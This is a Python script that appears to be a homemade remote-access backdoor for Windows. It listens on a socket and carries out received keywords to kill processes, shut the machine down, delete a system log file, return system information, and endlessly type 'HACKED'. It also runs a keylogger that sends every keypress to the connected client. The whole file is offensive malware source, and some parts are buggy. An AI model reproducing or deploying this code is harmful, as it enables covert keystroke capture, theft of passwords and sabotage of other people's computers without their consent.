import socket
import threading
import webbrowser
import pywhatkit
import os
from pynput.keyboard import Key, Controller
from pynput.keyboard import Listener

obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
obj.bind(('127.0.0.1', 8080))

def client(cli,add):
    while True:
        cmd = cli.recv(1025)
        cmd.decode('utf-8')
        cmd1=str(cmd)
        query = cmd1
        if 'webg' in query:
            webbrowser.open("www.google.com")
        elif 'webfb' in query:
            webbrowser.open("www.facebook.com")
        elif 'webinsta' in query:
            webbrowser.open("www.instagram.com")
        elif 's_webms' in query:
            pywhatkit.playonyt('mirchi song')
        elif 'oex' in query:
            os.system('start explorer')
        elif 'cex' in query:
            os.system('taskkill /f /im explorer.exe')
        elif 'shutoff' in query:
            os.system('shutdown /s')  
        elif 'o_notepad' in query:
            os.system('start notepad')
        elif 'c_notepad' in query:
            os.system('taskkill /f /im notepad.exe')
        elif 'o_webbrowser' in query:
            os.system('start microsoftedge')
        elif 'c_webbrowser' in query:
            os.system('taskkill /im msedge.exe /f')
        elif 'iamOUT' in query:
            break
        elif 'endTask' in query:
            os.system('taskkill /f /fi')
        elif 'logDel' in query:
            f = os.remove("C:\Windows\System32\Logfiles\Srt\SrtTrail.txt")
            f.close()
        elif 'sysinfo' in query:
            info = os.system('systeminfo')
            sys = str(info)
            cli.send(bytes(sys, 'utf-8'))
        elif 'sysact' in query:
            act = '!!!!!!ACTIVE!!!!!!'
            cli.send(bytes(act, 'utf-8'))
        elif 'keyLog' in query:
            def on_press(key):
                k=(str(key))
                cli.send(bytes(k, 'utf-8'))
            with Listener(on_press=on_press) as listener:
                listener.join()
        elif 'sysDown' in query:
            keyboard = Controller()
            while True:
                keyboard.type('HACKED\n')
        elif 'showTime' in query:
            os.system('start notepad')
            keyboard = Controller()
            while True:
                keyboard.type('HACKED\n')
            
            
            
while True:
    obj.listen(1)
    cli, add=obj.accept()
    threading._start_new_thread(client,(cli, add))
    cmd = cli.recv(1025)
    cmd.decode('utf-8')
    cmd1=str(cmd)
    query = cmd1
    if 'iamOUT' in query:
        break